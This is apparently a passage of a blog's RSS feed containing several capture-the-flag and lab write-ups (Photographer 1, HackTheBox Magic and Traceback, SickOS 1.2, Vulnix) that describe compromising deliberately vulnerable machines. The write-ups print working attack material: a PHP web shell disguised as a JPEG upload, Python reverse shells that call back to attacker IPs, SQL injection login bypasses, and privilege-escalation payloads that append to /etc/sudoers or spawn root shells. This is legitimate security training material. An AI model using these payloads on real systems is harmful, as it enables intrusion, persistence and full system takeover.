Content-Disposition: form-data; name=&quot;name&quot;

shell2.php
-----------------------------888515285638187952681108602
Content-Disposition: form-data; name=&quot;chunk&quot;

0
-----------------------------888515285638187952681108602
Content-Disposition: form-data; name=&quot;chunks&quot;

1
-----------------------------888515285638187952681108602
Content-Disposition: form-data; name=&quot;upload_session_start&quot;

1598278209
-----------------------------888515285638187952681108602
Content-Disposition: form-data; name=&quot;visibility&quot;

public
-----------------------------888515285638187952681108602
Content-Disposition: form-data; name=&quot;license&quot;

all
-----------------------------888515285638187952681108602
Content-Disposition: form-data; name=&quot;max_download&quot;

none
-----------------------------888515285638187952681108602
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php.jpg&quot;
Content-Type: image/jpeg

ÿØÿÛ&amp;lt;?php system($_REQUEST[cmd])?&amp;gt;

-----------------------------888515285638187952681108602--&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;uploadShell2.png&quot; alt=&quot;Upload Shell 2&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;www-data Shell&lt;/h1&gt;
&lt;p&gt;I used the “python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.10.10”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’” command to get a reverse shell.
&lt;img src=&quot;revShell.png&quot; alt=&quot;Reverse Shell&quot; /&gt;
I found the user.txt flag in the /home/daisa/ directory and I also found the credentials used to access the MySQL server inside the /var/www/html/koken/storage/configuration/database.php after spending a while searching for them, even though I didn’t find anything useful inside the server.
&lt;img src=&quot;dbcreds.png&quot; alt=&quot;DB credentials&quot; /&gt;
After this, I used the LinEnum script to enumerate the SUID binaries and I noticed that php7.2 had the SUID bit enabled, which looked really promising.
&lt;img src=&quot;suidbin.png&quot; alt=&quot;SUID Binaries&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;There is an entry on &lt;a href=&quot;https://gtfobins.github.io/gtfobins/php/&quot;&gt;GTFOBins&lt;/a&gt; for php with SUID, so I followed the instructions to get a root shell.
&lt;img src=&quot;privesc1.png&quot; alt=&quot;PrivEsc 1&quot; /&gt;
As seen in the image, the shell has an effective UID of 0 which means that we have root privileges, but some programs ignore the EUID. In my &lt;a href=&quot;https://barvent.github.io/write-ups/mrrobot_1_writeup/&quot;&gt;write-up for the Mr Robot 1 machine&lt;/a&gt; I didn’t try to get UID of 0, so I’ll show a way to do it in this write-up.&lt;/p&gt;
&lt;h1&gt;Changing EUID to UID&lt;/h1&gt;
&lt;p&gt;Probably there are faster ways, but I’ll explain the one that I know because it only requires to have access to a compiler. To this method we need to write a C code that uses the SetRUID system call and then gives us a shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setreuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Setuid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error executing command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Once we have the code we only need to upload it to the machine, compile it and run it to get a shell with UID of 0 (and more interactive than the one we had before).
&lt;img src=&quot;EUID2UID.png&quot; alt=&quot;EUID2UID&quot; /&gt;
The last flag is in the /root/ directory.&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;This is an easy machine which involves a little bit of guessing at the beginning and basic knowledge of cybersecurity. I probably spent more time than necessary on this machine because I wanted to find the credentials for the database, but I feel satisfied because I was able to guess the Koken admin credentials pretty fast.&lt;/p&gt;
</description>
        <pubDate>Mon, 24 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/photographer_1_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/photographer_1_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>HackTheBox: Magic WriteUp</title>
        <description>&lt;p&gt;Magic is a medium rated machine hosted in HackTheBox. As always, the goal is to obtain root and read the flag in /root/root.txt.&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;The IP is posted in the HackTheBox webpage, so it isn’t necessary to do a network scan.
&lt;img src=&quot;portscan.png&quot; alt=&quot;Port Scan&quot; /&gt;
There are only two ports open, 22 and 80.&lt;/p&gt;
&lt;h1&gt;Web Enumeration&lt;/h1&gt;
&lt;p&gt;In port 80 we can see a website. In the bottom left of the root page we can see that it allows to upload images if we login successfully.
&lt;img src=&quot;rootWeb.png&quot; alt=&quot;Root web&quot; /&gt;
In the login page we can see a simple login form which can be bypassed in two different ways.
&lt;img src=&quot;loginWeb.png&quot; alt=&quot;Login web&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Login Bypass 1&lt;/h1&gt;
&lt;p&gt;The login form is vulnerable to SQL Injection. Using username=a’ OR ‘1’=’1 and password=b’ OR ‘1’=’1 we get a redirection to upload.php.
&lt;img src=&quot;sqli.png&quot; alt=&quot;sqli&quot; /&gt;
The vulnerable part of the code can be read once we get shell access to the machine.
&lt;img src=&quot;vulnCode.png&quot; alt=&quot;vulnCode&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Login Bypass 2&lt;/h1&gt;
&lt;p&gt;Using gobuster we can discover the existence of the upload.php page (the output.txt was a file left by another user attempting to hack the machine, so I ignored it).
&lt;img src=&quot;gobuster.png&quot; alt=&quot;gobuster&quot; /&gt;
If we intercept the response to upload.php we can see that it is redirecting us to login.php, but there is more content below the redirection.
&lt;img src=&quot;uploadRedirection.png&quot; alt=&quot;Upload redirection&quot; /&gt;
We can just rewrite the “302 Found” status code to “200 OK” to access to the upload.php page.
&lt;img src=&quot;uploadWeb.png&quot; alt=&quot;Upload page&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Uploading a Shell&lt;/h1&gt;
&lt;p&gt;Uploading a .php file gets us a message with the allowed file types.
&lt;img src=&quot;allowedTypes.png&quot; alt=&quot;Allowed types&quot; /&gt;
Using the magic bytes for a JPEG file we can bypass the file type restriction and we can find the location of the uploaded file by looking at the source code.
&lt;img src=&quot;typeRestriction.png&quot; alt=&quot;Bypass restriction&quot; /&gt;
&lt;img src=&quot;findingFile.png&quot; alt=&quot;Finding the file&quot; /&gt;
&lt;img src=&quot;rce.png&quot; alt=&quot;RCE&quot; /&gt;
Using this code we can get a more interactive shell and then we can use a python reverse shell to get access to the machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;revshell1.png&quot; alt=&quot;Reverse Shell 1&quot; /&gt;
&lt;img src=&quot;revshell2.png&quot; alt=&quot;Reverse Shell 2&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;MySQL Enumeration and PrivEsc&lt;/h1&gt;
&lt;p&gt;Reading the php files we can obtain the credentials to access the database, but there isn’t a MySQL client installed in the machine. To solve this we can use “mysqldump” to dump the contents of the tables in a file.
&lt;img src=&quot;mysqlcredentials.png&quot; alt=&quot;MySQL Credentials&quot; /&gt;
&lt;img src=&quot;dumping.png&quot; alt=&quot;Dumping DB&quot; /&gt;
Inside the dump we can see a line with the username and password used to access to the upload page.
&lt;img src=&quot;creds.png&quot; alt=&quot;Credentials&quot; /&gt;
Enumerating the users with a valid shell we can see that there is a user called theseus. Theseus is also using this password to access his user in the machine.
&lt;img src=&quot;userEnum.png&quot; alt=&quot;User enum&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;SSH Access&lt;/h1&gt;
&lt;p&gt;Reading the sshd_config file I found that ssh has password authentication disabled, so I used the su command to change to user theseus and added a public key in the .ssh/authorized_keys file to get a more stable shell.
&lt;img src=&quot;authorized_keys.png&quot; alt=&quot;Authorized keys&quot; /&gt;
&lt;img src=&quot;ssh-login.png&quot; alt=&quot;SSH login&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;There is a SetUID binary that doesn’t exist in default Linux installations. When I executed it in my machine I found this error.
&lt;img src=&quot;sysinfo.png&quot; alt=&quot;Sysinfo&quot; /&gt;
&lt;img src=&quot;sysinfo_error.png&quot; alt=&quot;Sysinfo error&quot; /&gt;
This error means that the binary isn’t using absolute paths, so we can inject our code in there. To do so I created a file called fdisk (remember to grant it execution permission) and I added the current working directory to the PATH environment variable (use PATH=.:$PATH).&lt;br /&gt;
The code inside fdisk:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;theseus    ALL=(ALL:ALL) ALL&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sudoers&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Running the sysinfo binary from the same directory where fdisk is located grants sudo rights to theseus.
&lt;img src=&quot;pwn.png&quot; alt=&quot;Pwn&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This machine is pretty easy if you know the tricks that are needed to progress. The most problematic part was finding the SetUID binary to do the privesc as there were a lot of files to check.&lt;/p&gt;
</description>
        <pubDate>Sun, 23 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/htb_magic_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/htb_magic_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>SickOS 1.2 Write-Up</title>
        <description>&lt;p&gt;SickOS 1.2 is an OSCP-like machine from Vulnhub and the second of its series (I haven’t solved the first one yet).&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;As always, I’ve used Nmap to sweep the network and get the IP of the target machine. In this case you will see that my IP range has changed from previous write-ups and also that my IP has changed from .128 to .130. This is because I’ve changed my computer and I had a little trouble while configuring the virtual network.
&lt;img src=&quot;netScan.png&quot; alt=&quot;Net Scan&quot; /&gt;
The target IP is 192.168.124.129, as .128 was the IP of my machine before it changed to .130.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;Port Scan&quot; /&gt;
There are only two ports open and usually there isn’t anything interesting in the SSH server for the initial enumeration, so I started with HTTP.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Enumeration&lt;/h1&gt;
&lt;p&gt;The root page is a .php file that contains an image, so we can’t do anything with it. Nikto couldn’t find anything useful but Gobuster found a directory. (All the directories that start and end with ~ are treated with a 403 error, I don’t know why this happens).
&lt;img src=&quot;gobuster.png&quot; alt=&quot;gobuster&quot; /&gt;
The test directory has directory listing enabled, but it is empty. 
&lt;img src=&quot;test_dir_list.png&quot; alt=&quot;Test directory listing&quot; /&gt;
At this point I wasn’t sure about how to continue, so I searched on the Internet for other methods to enumerate HTTP. I found the OPTIONS HTTP request, which enumerates the allowed request methods for a directory. This method didn’t work on the root directory, but it returned some allowed methods in the test directory.
&lt;img src=&quot;OPTIONS-req.png&quot; alt=&quot;OPTIONS request&quot; /&gt;
In the “Allow” field there are the PUT and DELETE methods, which means that we can try to upload and delete files on the directory.
&lt;img src=&quot;uploadingShell.png&quot; alt=&quot;Shell upload&quot; /&gt;
CUrl sets the Expect header by default, which caused a 417 Expectation Failed error on the server. To solve this I added the ‘-H “Expect:”’, which removes the Expect header because it has no content.
&lt;img src=&quot;shellUploaded.png&quot; alt=&quot;Shell uploaded&quot; /&gt;
I used the same shell as always (the one that gets a “cmd” argument with a command) and then I tried to spawn a reverse shell. I had lots of problems with this because none of the reverse shells that I tried worked, so I assumed that a firewall was in place and I tried to make the reverse shell connect to a common port. Port 443 (which is used by HTTPS) worked.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.124.130&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;shellConnected.png&quot; alt=&quot;Shell connected&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;At first glance I couldn’t find anything useful to escalate privileges, besides the fact that the john user was in the sudo group. After a more through examination I noticed the chkrootkit file in the /etc/cron.daily directory.
&lt;img src=&quot;cronDaily.png&quot; alt=&quot;Cron Daily&quot; /&gt;
This file specifies that the chkrootkit binary will run everyday as root, so I used searchsploit to check if the binary has any vulnerability.
&lt;img src=&quot;searchsploit.png&quot; alt=&quot;Searchsploit&quot; /&gt;
Chrootkit 0.49 is vulnerable and leads to privilege escalation to the user that is running the binary (which is root in this case). I checked the version of the binary to see if the exploit could work using the -V argument.
&lt;img src=&quot;versionCheck.png&quot; alt=&quot;Checking version&quot; /&gt;
The exploit only requires to have an executable file in the /tmp directory called update. Whenever the chkrootkit binary is executed all the contents of the /tmp/update files are also executed (as root), so we only need to get an interactive shell. &lt;br /&gt;
In this case I simply added the www-data user to the /etc/sudoers file, but another solution could be to write an ssh key to the /root/.ssh/authorized_keys file or to spawn another reverse shell. To do so I used the following commands:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &amp;gt;&amp;gt; /etc/sudoers'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/update
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /tmp/update &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The files in cron.daily are executed once per day so I was thinking about leaving the VM alone for a day but using “sudo -l” I noticed that the command had already executed (I’ll explain why in the next section).
&lt;img src=&quot;root.png&quot; alt=&quot;Root&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Final Explanations&lt;/h1&gt;
&lt;p&gt;Once I got root access I began investigating about the firewall and the strange cron job. To check the firewall we can use the “iptables -L” command, but I found a file in /root with the exact specification of the rules so I used it because it was easier to read.
&lt;img src=&quot;iptables.png&quot; alt=&quot;iptables rules&quot; /&gt;
Basically, the rules are saying that the machine can only recieve packets with the destination port equal to 22 or 80 or with the source port equal to 443 or 8080 (the source a destination ports are reversed for the sent packets). This is why the reverse shell only worked when connecting to the port 443 of my local machine (8080 also works).&lt;br /&gt;
I found a file in the /etc/cron.d directory called chkrootkit, which also runs the chkrootkit binary but this time it runs at the maximum frequency that cron offers (the file was only readable by root). Due to this I didn’t have to wait a whole day for the binary to run. Another way to discover this cronjob without having root access could be to use “pspy” to spy the processes on the machine.
&lt;img src=&quot;crontab.png&quot; alt=&quot;Crontab&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;This has been a fairly difficult machine to solve, mainly because I didn’t know about the OPTIONS HTTP request method and I didn’t have much experience uploading files using PUT. Also, it required a little bit of guessing for the ports of the reverse shell and the frequency of the cronjob and to pay a lot of attention to details to avoid missing the cronjob.&lt;br /&gt; 
In conclusion, this has been a great learning experience and a really fun box to solve.&lt;/p&gt;
</description>
        <pubDate>Wed, 19 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/sickos_1.2_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/sickos_1.2_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>HackTheBox: Traceback Write-Up</title>
        <description>&lt;p&gt;Traceback is an easy rated machine hosted in HackTheBox. As always, the goal is to obtain root and read the flag in /root/root.txt&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;The IP is posted in the HackTheBox webpage, so it isn’t necessary to do a network scan.
&lt;img src=&quot;port_scan.png&quot; alt=&quot;Port Scan&quot; /&gt;
From the port scan we can see that there are only two ports open (22 and 80).
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;WebPage Enumeration&lt;/h1&gt;
&lt;p&gt;The root page contains a message telling us that the website has been owned. If we read the source code we can see a little more information.
&lt;img src=&quot;web_src.png&quot; alt=&quot;Web SRC&quot; /&gt;
Searching the name “Xh4H” in Google we can find a github page with some repositories. One of them has the same text that was in the commentary and some webshells.
&lt;img src=&quot;webshells.png&quot; alt=&quot;WebShells&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;WebShell Fuzzing&lt;/h1&gt;
&lt;p&gt;I cloned the repository in my machine and created a wordlist with the shells inside of it.
&lt;img src=&quot;webshells_wordlist1.png&quot; alt=&quot;WebShells Wordlist 1&quot; /&gt;
&lt;img src=&quot;webshells_wordlist2.png&quot; alt=&quot;WebShells Wordlist 2&quot; /&gt;
After this I used Wfuzz to fuzz the website using the wordlist to find the webshell.
&lt;img src=&quot;webfuzzing.png&quot; alt=&quot;webfuzzing&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Using the WebShell&lt;/h1&gt;
&lt;p&gt;Reading the source code for the webshell we can see the default credentials.
&lt;img src=&quot;def_creds.png&quot; alt=&quot;Default Credentials&quot; /&gt;
If we go to http://10.10.10.181/smevk.php we can see that the webshell has a login page.
&lt;img src=&quot;login_page.png&quot; alt=&quot;Login page&quot; /&gt;
The webshell has a console incorporated but I prefer to have a “normal” console so I edited a reverse shell that already was on the machine to connect to my machine.
&lt;img src=&quot;files_web.png&quot; alt=&quot;Files Web&quot; /&gt;
&lt;img src=&quot;editing_rev.png&quot; alt=&quot;Edit Reverse Shell&quot; /&gt;
&lt;img src=&quot;connection.png&quot; alt=&quot;Connection&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Sysadmin&lt;/h1&gt;
&lt;p&gt;There is a text file inside the webadmin home.
&lt;img src=&quot;notes_txt.png&quot; alt=&quot;Note.txt&quot; /&gt;
If we run “sudo -l” we can see that webadmin can run a lua interpreter as sysadmin, so we can just run “os.execute(‘/bin/sh’)” to get a shell.
&lt;img src=&quot;sudo_webadmin.png&quot; alt=&quot;sudo -l webadmin&quot; /&gt;
&lt;img src=&quot;shell_sysadmin.png&quot; alt=&quot;Shell sysadmin&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;Running LinPeas we can see some interesting files that can be written in the /etc directory.
&lt;img src=&quot;linpeas.png&quot; alt=&quot;LinPeas&quot; /&gt;
These files are executed by root every time that someone login (in this case, using SSH). We don’t have the password for the sysadmin user but we can write inside of .ssh/authorized_keys, which means that we can use a public and private key pair to authenticate without knowing the password.
&lt;img src=&quot;ssh-keygen.png&quot; alt=&quot;Generate key&quot; /&gt;
&lt;img src=&quot;add_key.png&quot; alt=&quot;Add key&quot; /&gt;
Now we have access to the machine using SSH, but we still need to get an interactive root shell. To do so I added a new entry inside /etc/sudoers that allowed sysadmin to run commands as root without suppling the password.
&lt;img src=&quot;modified-00.png&quot; alt=&quot;00-header modified&quot; /&gt;
&lt;img src=&quot;privesc-root.png&quot; alt=&quot;PrivEsc to root&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This machine is really easy even though is easy to miss the /etc/update-motd.d files if you don’t know what they do. This is the second time that I solve this machine, just because I didn’t take notes the first time and I wanted to have some writeups from HackTheBox.&lt;/p&gt;
</description>
        <pubDate>Sun, 16 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/htb_traceback_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/htb_traceback_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>HackLab: Vulnix Write-Up</title>
        <description>&lt;p&gt;HackLab: Vulnix is an intermediate rated OSCP-like machine hosted on Vulnhub (and the last rated machine on Abatchy’s list).&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;As always, I’ve used Nmap to sweep the network and get the IP of the target machine.
&lt;img src=&quot;netScan.png&quot; alt=&quot;NetScan&quot; /&gt;
The IP of the target machine is 192.168.56.133.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;PortScan&quot; /&gt;
There are lots of open ports in this machine and most of them lead to anything. I’ll explain what can be obtained in some of them, but I don’t know how to deal with all of them.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Ports Explanation&lt;/h1&gt;
&lt;p&gt;In port 25 there is a SMTP server which has the VRFY command enabled. This can be used to enumerate some users using dictionaries and to send malicious mails to them (as the server doesn’t have any type of authentication). I’ll show this in my writeup for SneakyMailer from HackTheBox when it gets retired.&lt;br /&gt;
&lt;img src=&quot;mailEnum.png&quot; alt=&quot;Mail Enumeration&quot; /&gt;
Port 79 has a Finger server, which can also be used to enumerate users in the machine. In this case we can get more information about them like the home directory, shell used… In earlier versions of it the server could be exploited to gain shell access to the machine.
&lt;img src=&quot;fingerEnum.png&quot; alt=&quot;Finger Enumeration&quot; /&gt;
Pop3 and IMAP are protocols used to retrieve emails (the ones with an S at the end use encryption). They can be used to read the emails of the users if we get their credentials but in this case it isn’t useful (Again, I’ll show this in the writeup for SneakyMailer).&lt;br /&gt;&lt;br /&gt;
RSH is a protocol similar to SSH but without encryption. RSH, Finger and SMTP (sendmail) had vulnerabilities in the past that were exploited by the Morris worm, so I suppose they are running in the machine as an “Easter Egg”.&lt;br /&gt;&lt;br /&gt;
I don’t really know what to do with the higher ports, some of them are for RPC stuff but I don’t know if they can be used to get more information.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;NFS Enumeration&lt;/h1&gt;
&lt;p&gt;I began by running “showmount” against the machine to see what directories it was exporting. It showed the directory “/home/vulnix”, which if you recall from before is the home directory for user vulnix.
&lt;img src=&quot;showmount.png&quot; alt=&quot;Showmount&quot; /&gt;
I mounted the directory using NFSv4 but I couldn’t access it because I didn’t had the privileges to do so. I also saw that the owner of the directory was nobody, which means that the root_squash flag was enabled (more on that later).
&lt;img src=&quot;nfsv4.png&quot; alt=&quot;Mounting NFSv4&quot; /&gt;
&lt;img src=&quot;nfsv4Permissions.png&quot; alt=&quot;NFSv4 Permissions&quot; /&gt;
NFS uses the UID and the GID to authenticate the user. The UID and GID of the user in the local machine must match with the ones in the folder that is being shared to access it. NFSv4 doesn’t give out the ids for security reasons (even though they can be bruteforced with a lot of patience), but the same cannot be said for earlier versions, so I tried to mount the directory using NFSv3.
&lt;img src=&quot;nfsv3.png&quot; alt=&quot;Mounting NFSv3&quot; /&gt;
Here we can see that both the UID and the GID of the folder are 2008, so I created a user in my machine that matched these values. 
&lt;img src=&quot;addUser.png&quot; alt=&quot;User Creation&quot; /&gt;
I changed to the new user using the su command and I got access to the directory.
&lt;img src=&quot;directoryList.png&quot; alt=&quot;Directory List&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Alternative Method&lt;/h1&gt;
&lt;p&gt;Reading other people writeups I found that the machine has a user called “user” which uses a weak password. Running a bruteforce attack against the SSH server (or RSH) we can get his password. From there we can get the UID and GID of the owner and the group of the folder.&lt;br /&gt;
I didn’t use this method because the bruteforcing was going really slow and I was trying to bruteforce the credentials for root, user and vulnix, so I ended up gaining access with the first method before the bruteforce ended.
&lt;img src=&quot;userMethod.png&quot; alt=&quot;Method 2&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Gaining SSH Access&lt;/h1&gt;
&lt;p&gt;By default SSH uses the file inside /home/$USER/.ssh/authorized_keys to use public/private key authentication, so I added a key that I generated to try to get access to the machine without using the password.
&lt;img src=&quot;foothold.png&quot; alt=&quot;Foothold&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;Running sudo -l we can see that vulnix can use sudoedit without supplying the password to edit the /etc/exports file, which is the file that defines the directories that are going to be exported by NFS.
&lt;img src=&quot;sudo-l.png&quot; alt=&quot;sudo -l&quot; /&gt;
